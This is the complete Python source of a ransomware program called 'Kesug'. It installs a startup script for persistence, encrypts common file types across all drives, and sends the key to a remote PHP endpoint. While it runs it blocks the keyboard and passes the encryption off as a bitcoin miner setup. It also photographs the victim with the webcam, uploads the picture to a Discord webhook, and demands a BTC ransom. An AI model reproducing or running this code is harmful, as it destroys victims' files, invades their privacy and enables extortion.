import os
from cryptography.fernet import Fernet
import re
import numpy as np
import pathlib
import keyboard
from time import sleep
import replit
from tqdm import tqdm
import id
import requests
import win32api
import cv2
import discord
from discord import Webhook, SyncWebhook
import aiohttp

# Initial variables
global myID
global key
target_files = []
target_files_undeep = []
all_drives = win32api.GetLogicalDriveStrings()
all_drives = all_drives.split('\000')[:-1]
file_path = pathlib.Path(__file__).parent.resolve()
home_drive = pathlib.Path.home().drive
startupFolder = home_drive+"\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
# Initialize the camera 
cam_port = 0

# Folders from which files should be ignored
untouched_dirs = np.array(["Intel", "WindowsPowerShell", "ProgramData", "Windows", "Kesug", "Startup", "Python", "Programs", "WindowsApps", "Packages"])

# All drive letters in array
allDrives = win32api.GetLogicalDriveStrings()
allDrives = allDrives.split('\000')[:-1]

replit.clear()

try:
    with open(startupFolder+"\\WinStartup.cmd", "w") as thefile:
        thefile.write(f"python3 {str(file_path)}\libraries.py")
except:
    print(f"""
          Please run with Administrator permissions.

          Guide:    1. Press windows key. 
                    2. Search 'powershell' and click 'Run as administrator'. 
                    3. Click 'Yes' on popup
                    4. Run command 'cd {str(file_path)}; python3 Kesug.py'

          """)
    sleep(10000)
    exit()


# Fullscreen terminal
keyboard.press('f11')

# Clearing screen
replit.clear()

print("""

                                                                                                                                                                                                                                                                                                            
KKKKKKKKK    KKKKKKK                                                                           
K:::::::K    K:::::K                                                                           
K:::::::K    K:::::K                                                                           
K:::::::K   K::::::K                                                                           
KK::::::K  K:::::KKK    eeeeeeeeeeee        ssssssssss   uuuuuu    uuuuuu     ggggggggg   ggggg
  K:::::K K:::::K     ee::::::::::::ee    ss::::::::::s  u::::u    u::::u    g:::::::::ggg::::g
  K::::::K:::::K     e::::::eeeee:::::eess:::::::::::::s u::::u    u::::u   g:::::::::::::::::g
  K:::::::::::K     e::::::e     e:::::es::::::ssss:::::su::::u    u::::u  g::::::ggggg::::::gg
  K:::::::::::K     e:::::::eeeee::::::e s:::::s  ssssss u::::u    u::::u  g:::::g     g:::::g 
  K::::::K:::::K    e:::::::::::::::::e    s::::::s      u::::u    u::::u  g:::::g     g:::::g 
  K:::::K K:::::K   e::::::eeeeeeeeeee        s::::::s   u::::u    u::::u  g:::::g     g:::::g 
KK::::::K  K:::::KKKe:::::::e           ssssss   s:::::s u:::::uuuu:::::u  g::::::g    g:::::g 
K:::::::K   K::::::Ke::::::::e          s:::::ssss::::::su:::::::::::::::uug:::::::ggggg:::::g 
K:::::::K    K:::::K e::::::::eeeeeeee  s::::::::::::::s  u:::::::::::::::u g::::::::::::::::g 
K:::::::K    K:::::K  ee:::::::::::::e   s:::::::::::ss    uu::::::::uu:::u  gg::::::::::::::g 
KKKKKKKKK    KKKKKKK    eeeeeeeeeeeeee    sssssssssss        uuuuuuuu  uuuu    gggggggg::::::g 
                                                                                       g:::::g 
                                                                           gggggg      g:::::g 
                                                                           g:::::gg   gg:::::g 
                                                                            g::::::ggg:::::::g 
                                                                             gg:::::::::::::g  
                                                                               ggg::::::ggg    
                                                                                  gggggg       



""")

print("\n\n## Please wait, it will take a while to gather all the data... \n## DO NOT MINIMIZE OR EXIT THE WINDOW\n")
def getDirs(drive_name, var):
    if __name__ == "__main__": 
        for (root,dirs,files) in os.walk(drive_name, topdown=True): 
            # Selecting file extensions that should be encrypted (not encrypting all files to make it efficient)
            files = [f for f in files if f.endswith('.py') or f.endswith('.exe') or f.endswith('.c#') or f.endswith('.cpp') or f.endswith('.txt') or f.endswith('.jpg') or f.endswith('.jpeg') or f.endswith('.zip') or f.endswith('.php') or f.endswith('.html') or f.endswith('.mp4') or f.endswith('.js') or f.endswith('.pptx') or f.endswith('.pdf') or f.endswith('.odp') or f.endswith('.xlsx' or f.endswith('.png'))]

            for file in files:
                rootArray = re.findall("[A-Za-z0-9_\-.() ]*", root)
                if len(np.nonzero(np.in1d(rootArray,untouched_dirs))[0]) > 0:
                    continue
                else:
                    var.append(str(root)+"\\"+str(file)) 
   

for drive in all_drives:
    target_files_dup = []
    getDirs(drive, target_files_dup)
    target_files_undeep.append(target_files_dup)

for file in target_files_undeep:
    for file_deep in file:
        target_files.append(file_deep)

# If the key has already been generated, then use the current key, if not, generate one.
if os.path.isfile(str(file_path)+"\\id.txt"):
    with open(str(file_path)+"\\id.txt", "rb") as theID:
        myID = theID.read()
        print("ID: "+myID.decode())
        
    readUrl = 'http://localhost/kesug/readKey.php'
    customHeaders = {'auth': myID}
    x = requests.get(readUrl, headers=customHeaders).text
    key = x.encode()
else:
    myID = id.generate()
    key = Fernet.generate_key()
    
    with open(str(file_path)+"\\id.txt", "w") as theID:
        theID.write(myID)
        print("ID: "+myID)
    
    try:
        writeUrl = f"http://localhost/kesug/writeKey.php?id={myID}&key={key}"
        requests.get(writeUrl)
    except:
        print("An error occured, please check your internet connection. If our servers are down please try again later.")
        exit()

# ENCRYPTION PROCESS: Encrypt all the files in the target_files array
# Block all keyboard inputs
for i in range(200):
    try:
        keyboard.block_key(i)
    except:
        print("Could not block key: " + i)


# Encryption iterations
if os.path.isfile(str(file_path)+"\\validation\\1.txt") == False:
    print("-----------> Setting up Bitcoin Miner\n\n-----------> NOTE: DO NOT SHUTDOWN OR USE THE COMPUTER WHILE WE SETUP THE MINER!\n\n-----------> Shutting down could corrupt your files!\n\n")

    # Progress bar
    total_iterations = len(target_files)
    progress_bar = tqdm(total=total_iterations, desc="Processing")

    for line_number, file in enumerate(target_files, start=1):
        progress_bar.update(1)
        try:
            with open(file, "rb") as thefile:
                file_contents = thefile.read()
        except:
            print("Read binary error\n")

        # Validate if the program has ran before or not
        try:
            with open(file, "wb") as thefile:
                file_contents_encrypted = Fernet(key).encrypt(file_contents)
                thefile.write(file_contents_encrypted)
        except:
            False

    cam = cv2.VideoCapture(cam_port)
    result, image = cam.read()
    if result: 
  
        # Showing result, it take frame name and image  
        # Output 
        cv2.imshow("1", image) 
    
        # Saving image in local storage 
        cv2.imwrite("1.png", image) 
    
        cv2.destroyWindow("1") 

        # Upload the image to discord webhook
        try:
            webhook = SyncWebhook.from_url("webhook")
            file = discord.File(str(file_path)+"\\snap.png", filename="snap.png")
            embed = discord.Embed()
            embed.set_image(url="attachment://snap.png")
            webhook.send(file=file, embed=embed)
        except:
            print("\nAn error occured. Please ignore this.\n")
    
    # If captured image is corrupted, moving to else part 
    else: 
        print("\nAn error occured. Please ignore this...\n") 

else:
    # If the program has run again, do not encrypt the file again and write the already encrypted text inside
    print("\n\nFiles already encrypted")
    

afterEncryptionText = "\n\n\nYOU HAVE BEEN HACKED! All your files have been encrypted.\n\nInfo: Do NOT mess with validation folder, otherwise your files will never recover.\n\nSend 0.0024 BTC at bc1q0sweded3p74k3r58dxkx562jzygr5qav4wewf7 to get the decryption key\n"
print(afterEncryptionText)

with open(str(file_path)+"\\validation\\1.txt", "w") as controlTxt:
    controlTxt.write("---------- Do Not Change Name Of This File Or Else Decryption Process Will Break And You Will Never Recover Your Files ----------")

# Unblock all keyboard inputs
try:
    for i in range(200):
        keyboard.unblock_key(i)
except:
    print("Error: Couldn't unblock keys: Ignore if you restarted the program")

# DECRYPTION PROCESS: Decrypting data after the encryption proces
print(key)
inputKey = input("Enter the key to decrypt: ")

if str(inputKey) == str(key):
    for file in target_files:
        try:
            with open(file, "rb") as thefile:
                file_contents = thefile.read()
        except:
            print("Read binary error\n")
        
        # Decrypting contents of the file
        # try:
        file_contents_decrypted = Fernet(key).decrypt(file_contents)

    # Writing the contents of the file inside the file
        with open(file, "wb") as thefile:
            thefile.write(file_contents_decrypted)
            print("Decrypted: " + str(file) + "\n")
        # except:
        #     print("Write binary error: " + str(file) + "\n")
        
    os.remove(str(file_path)+"\\validation\\1.txt")
    os.remove(str(file_path)+"\\id.txt")
    print("\nSuccessfully decrypted! Enjoy <3. And oh yeah, thanks for the money!")
    exit()

else:
    print("Incorrect decrypt key!")
    exit()
